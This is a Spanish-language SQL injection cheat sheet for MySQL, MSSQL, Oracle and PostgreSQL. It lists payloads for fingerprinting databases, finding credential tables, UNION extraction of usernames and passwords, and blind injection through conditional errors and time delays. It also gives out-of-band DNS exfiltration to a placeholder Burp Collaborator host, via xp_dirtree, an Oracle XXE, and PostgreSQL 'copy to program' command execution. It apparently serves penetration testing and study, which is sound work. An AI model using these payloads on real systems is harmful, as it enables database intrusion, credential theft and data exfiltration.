# Inyecciones por DDBB

## MySQL

### DDBB por defecto

```
mysql 
information_schema
```

### Version de DDBB

```
VERSION()
@@VERSION
@@GLOBAL.VERSION
```

### Credenciales por defecto

```
en tabla mysql.user, en las columnas user y password
```

### DDBB actual

```
database()
schema()
```

### Server Hostname

```
@@HOSTNAME
```

### String Concatenation
```
'hercu' 'les'
CONCAT('hercu','les')
```

### Substring
```
SUBSTRING('hercules', 4, 2)
```

### Comentarios
```
#comentario
-- comentario
/*comentario*/
```

### Listar tablas y columnas de una DDBB
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.tables WHERE table_name = 'tabla1'
```

### Errores condicionales
```
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
```

### Uniendo querys
```
QUERY-1-HERE; QUERY-2-HERE 
```

### Time delay
```
SELECT sleep(10) 
```

### Time delay condicionales
```
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
```

### DNS Lookup
```
# Solo funciona en Windows
LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'

# DNS Lookup con exfiltracion de datos
# Solo funciona para Windows
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a' 
```

## MSSQL

### DDBB por defecto

```
Model
Msdb
Tempdb
Northwind
Information_schema
```

### Version de DDBB

```
@@VERSION
```

### Credenciales por defecto

```
En 2 tablas:
master..syslogins
master..sysprocesses
en las columas name y loginame
```

### DDBB actual

```
db_name()
```

### Server Hostname

```
@@SERVERNAME
SERVERPROPERTY()
```

### Concatenar
```
'hercu'+'les'
```

### Substring
```
SUBSTRING('foobar', 4, 2) 
```

### Comentarios
```
--comentario
/*comentario*/
```

### Nombres de tablas y columnas en la DDBB
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Errores condicionales
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```

### Concatenar querys
```
QUERY-1-HERE; QUERY-2-HERE 
```

### Time delays
```
WAITFOR DELAY '0:0:10'
```

### Time delays condicionales
```
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```

### DNS Lookup
```
exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a' 

# DNS Lookup con exfiltracion de datos
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')
```  

## Oracle

### DDBB por defecto
```
System
Sysaux
```

### Version de DDBB
```
VERSION
banner FROM v$version
version FROM v$instance
```

### Credenciales por defecto
```
En las tablas:
all_users
sys.user$
En las columnas username, name y password
```

### DDBB actual
```
global_name
name
instance_name
SYS.DATABASE_NAME
```

### Server Hostname
```
host_name
UTL_INADDR.get_host_name
```

### Concatenar strings
```
'hercu'||'les'
' UNION SELECT username || '~' || password FROM users-- 
```

### Nombres de tablas y columnas
```
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 
```

### Errores condicionales
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
```

### Concatenar Querys
```
no soporta
```

### Time delay
```
dbms_pipe.receive_message(('a'),10) 
```

### Time Delay condicionales
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```

### DNS Lookup
```
# Explota una vulnerabilidad XXE de Oracle desactualizado
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual

# DNS Lookup con exfiltracion de datos
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual

# Esto funcionaria para Oracle actualizado pero con altos privilegios
SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
```

## PostgreSQL

### Concatenar Strings
```
'foo'||'bar' 
```

### Substring
```
SUBSTRING('foobar', 4, 2)
```

### Comentarios
```
--comentario
/*comentario*/
```

### Version de la base de datos
```
version()
```

### Nombre de las tablas y columnas de la base de datos
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Errores condicionales
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END 
```

### Concatenar querys
```
QUERY-1-HERE; QUERY-2-HERE 
```

### Time delay
```
pg_sleep(10)
```

### Time delay condicional
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 
```

### DNS Lookup
```
copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'

# DNS Lookup con exfiltracion de datos
# create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f(); 
```

